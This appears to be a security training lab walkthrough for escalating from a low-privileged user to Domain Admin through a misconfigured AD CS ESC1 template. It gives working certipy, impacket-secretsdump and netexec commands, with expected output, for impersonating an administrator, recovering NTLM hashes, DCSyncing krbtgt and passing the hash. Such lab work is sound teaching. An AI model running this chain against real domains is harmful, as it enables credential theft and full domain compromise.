# Lab 2: AD CS Abuse (ESC1) → Domain Admin

**Lab Description:** In this lab you will escalate from a single low-privileged domain user to
**full domain compromise** by abusing a misconfigured Active Directory Certificate Services
(AD CS) template (**ESC1**). You will request a certificate that impersonates a **Domain
Admin**, authenticate with it to recover that account's NTLM hash, and use the hash to
**DCSync** the domain's secrets.

**Estimated Duration:** **15 Minutes**

**Learning Objectives:** By the end of this lab, you will be able to:

- Enumerate AD CS for vulnerable certificate templates with **certipy**
- Abuse an **ESC1** template to request a certificate as another user
- Authenticate with a certificate (PKINIT) to recover an NTLM hash
- Perform a **DCSync** to dump domain credentials (incl. `krbtgt`)

**Environment / starting position:**

| Item | Value |
|---|---|
| Domain | `corp.local` (DC `dc1` @ 10.0.1.10) |
| Enterprise CA | `corp-CA` on `adcs.corp.local` (10.0.1.40) |
| Attacker host | `kali` |
| Starting credential (low-priv user) | `amiller` / `Summer2024` |
| Target to impersonate | `adm.itadmin` (a Domain Admin) |

> **Why `adm.itadmin` and not the built-in `Administrator`?** The built-in `Administrator`
> account has no `userPrincipalName`, so a UPN-based certificate can't map to it (you'd get
> `KDC_ERR_C_PRINCIPAL_UNKNOWN`). `adm.itadmin` is a named Domain Admin that *has* a UPN, so
> the certificate maps cleanly — and it's equally privileged.

---

1. *(Optional)* From **Kali**, enumerate AD CS for vulnerable templates with **certipy-ad**.

    ```bash
    certipy-ad find -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 -vulnerable -stdout
    ```

    This should report `ESC1-VulnUser` as **ESC1** vulnerable.

    > **Note:** if `find` errors with an SSL/`Connection reset` message, that's certipy probing
    > the CA's HTTPS enrollment endpoint (this lab uses HTTP). It's harmless — the exploit in
    > the next steps does not depend on it, and we already know the vulnerable template.

1. Abuse ESC1: request a certificate from the vulnerable template, setting the subject UPN to
   **adm.itadmin@corp.local** — i.e. ask the CA for a cert that identifies you as that Domain
   Admin.

    ```bash
    certipy-ad req -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 \
      -target adcs.corp.local -ca 'corp-CA' -template 'ESC1-VulnUser' \
      -upn 'adm.itadmin@corp.local'
    ```

    **Expected Output:** the CA issues the certificate and saves it locally.

    ```output
    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Got certificate with UPN 'adm.itadmin@corp.local'
    [*] Saving certificate and private key to 'adm.itadmin.pfx'
    ```

1. Authenticate to the DC with the issued certificate (PKINIT). certipy exchanges it for a
   Kerberos TGT and recovers the account's **NTLM hash**.

    ```bash
    certipy-ad auth -pfx adm.itadmin.pfx -dc-ip 10.0.1.10
    ```

    **Expected Output:**

    ```output
    [*] Using principal: 'adm.itadmin@corp.local'
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Got hash for 'adm.itadmin@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
    ```

    Copy the `<NTLM_HASH>` (the part after the colon) — that's the Domain Admin's hash.

    > **Note (time skew):** if `auth` returns `KRB_AP_ERR_SKEW`, sync the clock and retry:
    > `sudo systemctl restart systemd-timesyncd && sleep 5`
    >
    > **Note (`KDC_ERROR_CLIENT_NOT_TRUSTED`):** this means the DC is enforcing strong
    > certificate binding (KB5014754). The lab DCs ship with this relaxed
    > (`StrongCertificateBindingEnforcement=0`) so ESC1 works; if you see this error, that
    > setting hasn't applied yet — see the trainer note in `VALIDATION-CHECKLIST` / re-run the
    > DC fix.

1. Use the recovered hash to **DCSync** the domain — replicate secrets straight from the DC.
   Here we pull the `krbtgt` account (the key to forging Golden Tickets), proving full domain
   compromise. Replace `<NTLM_HASH>` with the hash from the previous step.

    ```bash
    impacket-secretsdump 'corp.local/adm.itadmin@10.0.1.10' -hashes ':<NTLM_HASH>' -just-dc-user krbtgt
    ```

    **Expected Output:**

    ```output
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<krbtgt_hash>:::
    ```

1. *(Optional)* Confirm Domain Admin access with the recovered hash (pass-the-hash):

    ```bash
    netexec smb 10.0.1.10 -u adm.itadmin -H <NTLM_HASH>
    ```

    **Expected Output:** the `(Pwn3d!)` flag indicates administrative access to the DC.

    ```output
    SMB   10.0.1.10   445   dc1   [+] corp.local\adm.itadmin:<hash> (Pwn3d!)
    ```

**Lab 2 Recap:** In this lab, you:

- Abused the `ESC1-VulnUser` template's enrollee-supplies-subject misconfiguration to request
  a certificate impersonating the Domain Admin `adm.itadmin`.
- Authenticated with the certificate (PKINIT) to recover its NTLM hash.
- **DCSync'd** the domain and dumped the `krbtgt` hash — full domain compromise.

This proves the AD CS **ESC1** attack path is exploitable end-to-end and the environment can
be driven from a single low-privileged user to **Domain Admin**.

## You have successfully completed Lab 2.

You have validated two complete attack chains against the lab.
